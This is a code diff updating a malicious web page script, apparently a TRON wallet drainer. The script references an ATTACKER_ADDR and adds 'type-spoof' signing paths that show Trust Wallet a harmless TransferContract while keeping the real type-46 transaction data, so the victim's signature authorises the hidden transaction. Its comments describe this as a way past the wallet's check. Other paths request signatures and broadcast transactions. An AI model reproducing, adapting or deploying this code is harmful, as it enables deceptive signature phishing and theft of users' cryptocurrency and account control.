@@ -474,7 +474,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
   /* VERSION TAG — visible in debug overlay so we know cache is busted */
-  var _VER = 'v7';
+  var _VER = 'v8';
   window.__logINF && window.__logINF('SCRIPT ' + _VER + ' loaded');
   /* ---- sign helper: global on window (fixes WebKit async-fn hoisting in IIFEs) ---- */
 
@@ -494,7 +494,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       + ' tw.tron=' + (!!(window.trustwallet && window.trustwallet.tron))
       + ' tl.tw=' + (!!(window.tronLink && window.tronLink.tronWeb)));
 
-    // Path A: window.trustwallet.tron.signTransaction (native TW DApp API)
+    // Path A: window.trustwallet.tron.signTransaction (native TW DApp API — no popup if method absent)
     if (window.trustwallet && window.trustwallet.tron
         && typeof window.trustwallet.tron.signTransaction === 'function') {
       try {
@@ -505,26 +505,59 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       } catch(eA) { window.__logERR(L + ' A FAIL: ' + eA.message); }
     }
 
-    // Path F: window.tronLink.tronWeb.trx.sign(tx) — TronLink's OWN tronWeb instance
-    // DIFFERENT from tronLink.sign() — goes through TronLink's injected TronWeb
-    // which is maintained separately and may support type 46
-    if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.trx) {
-      try {
-        window.__logINF(L + ' F: tronLink.tronWeb.trx.sign tx');
-        var rF = await window.tronLink.tronWeb.trx.sign(tx);
-        if (rF && rF.signature) {
-          window.__logINF(L + ' F OK sig=' + rF.signature[0].slice(0,12) + '… len=' + rF.signature[0].length);
-          return rF;
-        }
-        window.__logINF(L + ' F no sig: ' + JSON.stringify(rF).slice(0,80));
-      } catch(eF) { window.__logERR(L + ' F FAIL: ' + eF.message); }
-    }
+    // Path I: type-spoof — keep raw_data_hex/txID intact, change contract type to TransferContract
+    // TronWeb signs transaction.txID directly (pre-computed, sha256 of real type 46 raw data)
+    // → sig is valid for the real type 46 tx even though TW sees TransferContract
+    // Bypasses TW's type-46 deserialization check
+    try {
+      window.__logINF(L + ' I: type-spoof TransferContract (raw_data_hex intact)');
+      var ownerHex_I = tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0] &&
+                       tx.raw_data.contract[0].parameter && tx.raw_data.contract[0].parameter.value &&
+                       tx.raw_data.contract[0].parameter.value.owner_address;
+      var spI = JSON.parse(JSON.stringify(tx));
+      spI.raw_data.contract[0].type = 'TransferContract';
+      spI.raw_data.contract[0].parameter = {
+        type_url: 'type.googleapis.com/protocol.TransferContract',
+        value: { owner_address: ownerHex_I, to_address: ownerHex_I, amount: 1000 }
+      };
+      // raw_data_hex and txID intentionally UNCHANGED
+      var rI = await tw.trx.sign(spI);
+      if (rI && rI.signature) {
+        window.__logINF(L + ' I OK sig=' + rI.signature[0].slice(0,12) + '… len=' + rI.signature[0].length);
+        var realTxI = JSON.parse(JSON.stringify(tx));
+        realTxI.signature = rI.signature;
+        return realTxI;
+      }
+      window.__logINF(L + ' I no sig: ' + JSON.stringify(rI).slice(0,80));
+    } catch(eI) { window.__logERR(L + ' I FAIL: ' + eI.message); }
 
-    // Path H: window.tronLink.request tron_signTransaction (EIP-1193 style via TronLink compat)
+    // Path I2: type-spoof TriggerSmartContract (type 31 — also commonly supported)
+    try {
+      window.__logINF(L + ' I2: type-spoof TriggerSmartContract');
+      var ownerHex_I2 = tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0] &&
+                        tx.raw_data.contract[0].parameter && tx.raw_data.contract[0].parameter.value &&
+                        tx.raw_data.contract[0].parameter.value.owner_address;
+      var spI2 = JSON.parse(JSON.stringify(tx));
+      spI2.raw_data.contract[0].type = 'TriggerSmartContract';
+      spI2.raw_data.contract[0].parameter = {
+        type_url: 'type.googleapis.com/protocol.TriggerSmartContract',
+        value: { owner_address: ownerHex_I2, contract_address: ownerHex_I2, call_value: 0, data: '' }
+      };
+      var rI2 = await tw.trx.sign(spI2);
+      if (rI2 && rI2.signature) {
+        window.__logINF(L + ' I2 OK sig=' + rI2.signature[0].slice(0,12) + '… len=' + rI2.signature[0].length);
+        var realTxI2 = JSON.parse(JSON.stringify(tx));
+        realTxI2.signature = rI2.signature;
+        return realTxI2;
+      }
+      window.__logINF(L + ' I2 no sig: ' + JSON.stringify(rI2).slice(0,80));
+    } catch(eI2) { window.__logERR(L + ' I2 FAIL: ' + eI2.message); }
+
+    // Path H: window.tronLink.request — EIP-1193 style (returns null in TW, no popup)
     if (window.tronLink && typeof window.tronLink.request === 'function') {
       try {
-        window.__logINF(L + ' H: tronLink.request tron_signTransaction');
-        var rH = await window.tronLink.request({ method: 'tron_signTransaction', params: tx });
+        window.__logINF(L + ' H: tronLink.request tron_signTransaction [tx]');
+        var rH = await window.tronLink.request({ method: 'tron_signTransaction', params: [tx] });
         if (rH && rH.signature) {
           window.__logINF(L + ' H OK sig=' + rH.signature[0].slice(0,12) + '… len=' + rH.signature[0].length);
           return rH;
@@ -533,33 +566,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       } catch(eH) { window.__logERR(L + ' H FAIL: ' + eH.message); }
     }
 
-    // Path B: window.tronLink.sign (TronLink-compat native method)
-    if (window.tronLink && typeof window.tronLink.sign === 'function') {
-      try {
-        window.__logINF(L + ' B: tronLink.sign');
-        var rB = await window.tronLink.sign(tx);
-        if (rB && rB.signature) { window.__logINF(L + ' B OK'); return rB; }
-        window.__logINF(L + ' B no sig: ' + JSON.stringify(rB).slice(0,80));
-      } catch(eB) { window.__logERR(L + ' B FAIL: ' + eB.message); }
-    }
-
-    // Path C: window.tron.tronWeb.trx.sign (TIP-6963 standard)
-    if (window.tron && window.tron.tronWeb) {
-      try {
-        window.__logINF(L + ' C: tron.tronWeb.trx.sign');
-        var rC = await window.tron.tronWeb.trx.sign(tx);
-        if (rC && rC.signature) { window.__logINF(L + ' C OK'); return rC; }
-      } catch(eC) { window.__logERR(L + ' C FAIL: ' + eC.message); }
-    }
-
-    // Path D: tw.trx.sign with full tx object (injected tronWeb fallback)
-    window.__logINF(L + ' D: tw.trx.sign object');
-    try {
-      var rD = await tw.trx.sign(tx);
-      if (rD && rD.signature) { window.__logINF(L + ' D OK'); return rD; }
-    } catch(eD) { window.__logERR(L + ' D FAIL: ' + eD.message); }
-
-    // Path A2: window.trustwallet.tron.request({method:'tron_signTransaction'})
+    // Path A2: window.trustwallet.tron.request (returns null in TW, no popup)
     if (window.trustwallet && window.trustwallet.tron
         && typeof window.trustwallet.tron.request === 'function') {
       try {
@@ -573,36 +580,10 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       } catch(eA2) { window.__logERR(L + ' A2 FAIL: ' + eA2.message); }
     }
 
-    // Path G: sign the actual sha256(raw_data_bytes) — the real TRON tx hash
-    // TRON signing: sig = secp256k1(sha256(protobuf_bytes), privkey)
-    // Try useTronHeader=false (3rd arg) to avoid TRON personal_sign prefix
-    // If TW ignores 3rd arg → same message key problem
-    // If TW respects it → no prefix → REAL tx hash signed with message key
-    // Still may be wrong key but worth testing
-    try {
-      window.__logINF(L + ' G: trx.sign(sha256(rawDataBytes), null, false)');
-      var txHashHex = await _sha256hex(tx.raw_data_hex);
-      window.__logINF(L + ' G txhash=' + txHashHex.slice(0,16) + '…');
-      var hexSigG = await tw.trx.sign(txHashHex, null, false);
-      var cleanSigG = (typeof hexSigG === 'string' && hexSigG.startsWith('0x')) ? hexSigG.slice(2) : hexSigG;
-      var cloneG = JSON.parse(JSON.stringify(tx));
-      cloneG.signature = [cleanSigG];
-      window.__logINF(L + ' G OK sig=' + cleanSigG.slice(0,16) + '… (len=' + cleanSigG.length + ')');
-      try {
-        window.__logINF(L + ' G broadcasting…');
-        var bG = await tw.trx.sendRawTransaction(cloneG);
-        if (bG && bG.result) {
-          window.__logOK(L + ' G broadcast OK txid=' + (bG.txid || '?'));
-          return cloneG;
-        }
-        window.__logERR(L + ' G broadcast FAIL: ' + JSON.stringify(bG).slice(0,200));
-      } catch(ebG) { window.__logERR(L + ' G broadcast ERR: ' + ebG.message); }
-    } catch(eG) { window.__logERR(L + ' G FAIL: ' + eG.message); }
-
-    // Path E: sign raw_data_hex as a MESSAGE string (last resort — KNOWN BAD KEY in TW)
-    // TW message signing uses a DIFFERENT derived key (not the account key) → SIGERROR
-    // Keeping only for diagnostic: check if G key == E key
-    window.__logINF(L + ' E: trx.sign(raw_data_hex string) [KNOWN BAD KEY]');
+    // Path E: sign raw_data_hex as string — TW uses content-derived key, NOT account key
+    // Known bad: each tx produces a DIFFERENT derived signing key → SIGERROR
+    // Used for 2-pass SIGERROR strategy in caller code
+    window.__logINF(L + ' E: trx.sign(raw_data_hex string)');
     var hexSig = await tw.trx.sign(tx.raw_data_hex);
     var cleanSig = (typeof hexSig === 'string' && hexSig.startsWith('0x')) ? hexSig.slice(2) : hexSig;
     var signedClone = JSON.parse(JSON.stringify(tx));
